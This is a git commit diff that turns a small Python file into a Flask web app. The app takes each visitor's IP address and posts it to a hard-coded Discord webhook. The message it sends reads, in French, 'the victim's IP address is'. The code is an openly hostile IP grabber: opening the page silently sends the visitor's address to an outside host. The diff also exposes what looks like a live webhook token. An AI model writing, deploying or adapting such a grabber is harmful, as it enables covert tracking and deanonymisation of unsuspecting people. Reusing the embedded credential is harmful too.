0d00e9e762f282ae78f8f98fcca7e14f89a799fd
FralkA <153741594+FralkA@users.noreply.github.com>
2024-01-10 11:41:17 +0100

    Update ipgrab.py

--- api/ipgrab.py
+++ api/ipgrab.py
@@ -1,20 +1,32 @@
+from flask import Flask, request
 import requests
 import json
 
+app = Flask(__name__)
+
 def ipgrab():
-    user_ip = requests.remote_addr
+    user_ip = request.remote_addr
     return user_ip
 
-webhook_url = "https://discord.com/api/webhooks/1194589877233262662/6U_vTLLwpfgcumnX1m--aWxWuaHpJFzIQ0rrJnT6HHQB4ZQjk1EoQT_unRp6JBIGJqnR"
-message = "l'addresse ip de la victime est {user_ip}"
+@app.route('/')
+def webhook():
+    user_ip = ipgrab()
+    message = f"L'adresse IP de la victime est : {user_ip}"
 
-payload = {
-    "content": message
-}
+    webhook_url = "https://discord.com/api/webhooks/1194589877233262662/6U_vTLLwpfgcumnX1m--aWxWuaHpJFzIQ0rrJnT6HHQB4ZQjk1EoQT_unRp6JBIGJqnR"
 
-headers = {
-    "Content-Type": "application/json"
-}
+    payload = {
+        "content": message
+    }
 
-response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+    headers = {
+        "Content-Type": "application/json"
+    }
+
+    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+    
+    return "Message envoyé avec succès !"
+
+if __name__ == '__main__':
+    app.run()
 
